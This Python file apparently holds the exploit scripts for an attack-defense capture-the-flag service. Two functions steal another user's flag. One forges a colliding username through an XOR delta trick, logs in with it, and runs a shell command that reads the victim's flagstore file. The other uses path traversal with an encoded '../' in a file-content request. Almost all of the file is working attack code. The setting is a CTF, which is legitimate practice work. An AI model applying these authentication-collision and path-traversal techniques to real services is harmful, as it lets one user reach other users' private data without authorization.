import random
import re
import base64
import string
from httpx import AsyncClient
from util import (
    do_repl_auth,
    repl_websocket,
    sh,
    do_user_register,
    do_user_login,
    do_create_devenv,
    do_get_devenv_file_content,
)


def alphanumeric_to_long(s, reverse_bytes=False):
    ret = 0
    for c in s:
        ret = ret << 8
        v = ord(c)
        if reverse_bytes:
            v = int("{:08b}".format(v)[::-1], 2)
        if v == 0b110000:
            ret = ret ^ 0b1100000
        elif v >= 0b110010 and v <= 0b110101:
            ret = ret ^ (v + 74)
        else:
            ret = ret ^ v
    return ret


def long_to_alphanumeric(n, reverse_bytes=False):
    s = []
    while n > 0:
        c = n & 0xFF
        if reverse_bytes:
            c = int("{:08b}".format(c)[::-1], 2)
        if c == 0b1100000:
            s.append(0b110000)
        elif c >= 0b1111011 and c <= 0b01111111:
            s.append(c - 74)
        else:
            s.append(c)
        n = n >> 8
    s.reverse()
    return bytes(s).decode()


def get_random_delta():
    n = random.randint(1, 100000)
    print(n)
    f = 0
    with open("deltas.txt", "r") as file:
        f = int(file.readline(), 16)
        if n > 1:
            for num, line in enumerate(file, start=2):
                if num == n:
                    return int(line, 16)
    return f


def exploit0_apply_delta(s):
    delta = get_random_delta()
    n = alphanumeric_to_long(s)
    n = n ^ delta
    return long_to_alphanumeric(n)


async def exploit0(
    attack_info: str,
    address: str,
    client: AsyncClient,
):
    if attack_info is None:
        raise Exception("No attack_info")

    if len(attack_info) != 60:
        raise Exception("Incorrect attack_info username length")

    delta_username = exploit0_apply_delta(attack_info)

    password = "deafbeefdeadbeefdeadbeef"

    (cookies, id) = await do_repl_auth(client, delta_username, password)
    response = await repl_websocket(
        address,
        cookies,
        id,
        [sh(f"echo FLAG && cat ../{attack_info}/flagstore.txt").default()],
    )

    match = re.findall(r"FLAG\s*([A-Za-z0-9\+\=\/]+)\s*OK", response)
    if len(match) == 0:
        return None

    flag = base64.b64decode(match[0]).decode("utf-8")
    return flag


async def exploit1(
    attack_info: str,
    client: AsyncClient,
):
    if attack_info is None:
        raise Exception("No attack_info")

    username = "".join(random.choice(string.ascii_lowercase) for _ in range(35))
    password = "".join(random.choice(string.ascii_lowercase) for _ in range(35))
    name = "".join(random.choice(string.ascii_lowercase) for _ in range(10))

    await do_user_register(client, username, password)
    cookies = await do_user_login(client, username, password)
    devenvUuid = await do_create_devenv(
        client,
        cookies,
        name,
        "echo FLAG",
        "cat flagstore.txt && echo OK",
    )

    payload = await do_get_devenv_file_content(
        client,
        cookies,
        devenvUuid,
        "flagstore.txt",
        f"?uuid={devenvUuid}%2F..%2F{attack_info}",
    )
    flag = base64.b64decode(payload).decode("utf-8")
    return flag
